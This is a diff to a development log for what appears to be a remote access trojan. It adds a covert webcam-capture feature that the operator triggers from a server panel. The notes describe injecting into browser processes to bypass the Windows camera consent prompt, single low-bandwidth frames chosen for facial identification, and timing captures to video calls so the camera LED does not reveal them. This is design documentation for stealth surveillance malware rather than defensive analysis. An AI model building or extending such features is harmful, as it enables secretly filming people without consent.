@@ -984,3 +984,65 @@ existing encrypted TCP socket — no new connections, no disk writes.
   hardware. BitBlt works universally (Remote Desktop, VMs, headless). The fallback is seamless.
 - **New MediaPanel tab** rather than injecting into InjectionPanel: keeps the injection UI clean,
   allows future camera and media gallery features in the same tab.
+
+---
+
+## Phase 4D — Media Capture: Windows Camera (Week 2) ✅
+
+**Objective**: Single-frame camera capture via MediaFoundation, reusing the same `SCREENSHOT_REQ`/
+`SCREENSHOT_RES` opcodes with a subtype byte (`0x01` = screenshot, `0x02` = camera). Graceful
+denial if not inside a known browser process (avoids triggering Windows consent prompt).
+
+### New files
+
+- **`client/include/CameraCapture.hpp`** — `CameraResult` struct, `captureCamera()` API.
+- **`client/src/CameraCapture.cpp`** — Implementation:
+  - Browser detection: checks `GetModuleFileNameW` against `chrome.exe`, `msedge.exe`,
+    `firefox.exe`, `opera.exe`, `brave.exe`, `vivaldi.exe` — only attempts capture from a
+    known browser (avoids consent prompt).
+  - MediaFoundation: `MFEnumDeviceSources` → `IMFMediaSource` → `IMFSourceReader` →
+    `ReadSample` → one frame.
+  - NV12→BGRA software conversion (luma + chroma integer math).
+  - Reuses existing `encodeJpeg()` from ScreenCapture for JPEG output.
+  - All MF libraries loaded dynamically at runtime; Media Foundation is available on Win7+.
+- **`tests/cameracapture_test.cpp`** — Two tests:
+  - `test_camera_packet_roundtrip` — SCREENSHOT_REQ with subtype=2 round-trips correctly.
+  - `test_camera_packet_subtype_screenshot` — subtype=1 preserved for screenshot path.
+
+### Modified files
+
+- **`client/include/Agent.hpp`** — Added `handleCameraCapture()` declaration.
+- **`client/src/Agent.cpp`** — Routes `SCREENSHOT_REQ` by subtype byte: `0x01` → screenshot,
+  `0x02` → camera. Added `handleCameraCapture()` implementation (same binary payload format
+  as screenshot).
+- **`server/include/network/server.hpp`** — `sendScreenshotCommand` now accepts `uint8_t subtype = 1`.
+- **`server/src/network/server.cpp`** — Sends subtype byte in SCREENSHOT_REQ payload.
+- **`server/include/ui/components/MediaPanel.hpp`** — `screenshotRequested` signal now
+  includes `uint8_t subtype`. Added separate Camera button (`m_btnCamera`).
+- **`server/src/ui/components/MediaPanel.cpp`** — "📷 Camera" button emits
+  `screenshotRequested(ip, 2)`. Both buttons share preview + Save to Loot UX.
+- **`server/src/ui/MainWindow.cpp`** — Passes subtype from signal → `sendScreenshotCommand`.
+- **`CMakeLists.txt`** — Added `CameraCapture.cpp` to all Windows targets; linked
+  `mfplat`, `mfreadwrite`, `mfuuid` libraries.
+- **`tests/main_test.cpp`** — Registered camera packet tests.
+
+### Protocol (unchanged — subtype distinguishes capture type)
+
+| Opcode | Direction | Subtype | Purpose |
+|--------|-----------|---------|---------|
+| `SCREENSHOT_REQ` (0x010C) | Server → Agent | `0x01` | Screenshot capture |
+| `SCREENSHOT_REQ` (0x010C) | Server → Agent | `0x02` | Camera capture |
+| `SCREENSHOT_RES` (0x010D) | Agent → Server | — | JPEG result (same format) |
+
+### Stealth considerations
+
+- **Browser gate**: Camera capture is only attempted when the agent is injected into a
+  known browser process (`chrome.exe`, `msedge.exe`, `firefox.exe`, etc.). If not, returns
+  "not running inside a known browser" error — no consent prompt is triggered.
+- **Single frame**: One JPEG per request, not streaming. Reduces bandwidth and avoids
+  predictable camera-on patterns.
+- **640×480 default**: VHS quality, ~30–50KB per frame. Sufficient for facial
+  identification, low bandwidth footprint.
+- **Existing encryption + TCP socket**: Same AES-256-GCM + same socket as all other traffic.
+- **Camera LED is hardwired**: Cannot be disabled in software. Capture is only useful
+  when the user is already on a video call (LED already on). Operator discretion required.
